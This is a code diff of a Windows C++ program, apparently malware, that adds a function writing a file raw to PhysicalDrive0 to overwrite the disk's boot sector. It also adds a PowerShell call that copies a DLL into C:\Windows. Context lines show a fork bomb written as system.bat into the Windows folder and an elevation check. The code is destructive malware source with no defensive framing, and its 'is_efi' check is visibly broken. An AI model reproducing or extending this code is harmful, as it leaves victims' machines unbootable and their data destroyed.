@@ -7,11 +7,66 @@
 #include <stdlib.h>
 #include <direct.h>
 #include <fstream>
+#include <vector>
+using namespace std;
+
+void UnpackDeps() {
+    system("powershell Copy-Item \"Checkr.dll\" \"C:\\Windows\"");
+}
 
 bool is_efi() {
     SYSTEM_INFO si;
     GetSystemInfo(&si);
     return si.dwNumberOfProcessors;
+}
+
+int BIOSBootFlash() {
+    // Open the source file
+    HANDLE hSource = CreateFile(TEXT("boot.bin"), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hSource == INVALID_HANDLE_VALUE) {
+         cerr << "Failed to open source file.\n";
+        return 1;
+    }
+
+    // Get the size of the source file
+    LARGE_INTEGER fileSize;
+    if (!GetFileSizeEx(hSource, &fileSize)) {
+        cerr << "Failed to get source file size.\n";
+        CloseHandle(hSource);
+        return 1;
+    }
+
+    // Read the source file into a buffer
+    vector<BYTE> buffer(fileSize.QuadPart);
+    DWORD bytesRead;
+    if (!ReadFile(hSource, buffer.data(), buffer.size(), &bytesRead, NULL) || bytesRead != buffer.size()) {
+        cerr << "Failed to read source file.\n";
+        CloseHandle(hSource);
+        return 1;
+    }
+
+    // We're done with the source file
+    CloseHandle(hSource);
+
+    // Open the target disk
+    HANDLE hDevice = CreateFile(TEXT("\\\\.\\PhysicalDrive0"), GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
+    if (hDevice == INVALID_HANDLE_VALUE) {
+        cerr << "Failed to open device.\n";
+        return 1;
+    }
+
+    // Write the buffer to the disk
+    DWORD bytesWritten;
+    if (!WriteFile(hDevice, buffer.data(), buffer.size(), &bytesWritten, NULL) || bytesWritten != buffer.size()) {
+        cerr << "Failed to write to device.\n";
+        CloseHandle(hDevice);
+        return 1;
+    }
+
+    // We're done with the device
+    CloseHandle(hDevice);
+
+    return 0;
 }
 
 //Added a function to set a system variable to a string
@@ -36,7 +91,7 @@ bool SetPermanentEnvironmentVariable(LPCTSTR value, LPCTSTR data) {
 void forkbomb() {
     const char* path = "C:\\Windows";
     _chdir(path);
-    std::ofstream forkfile("system.bat");
+    ofstream forkfile("system.bat");
     forkfile << "@echo off\n" << "%0|%0";
     forkfile.close();
     /*const char* batchpath = "C:\\Windows\\system.bat";*/
@@ -55,7 +110,7 @@ BOOL IsElevated() {
             fRet = Elevation.TokenIsElevated;
         }
     }
-    if (hToken) {
+       if (hToken) {
         CloseHandle(hToken);
     }
     return fRet;
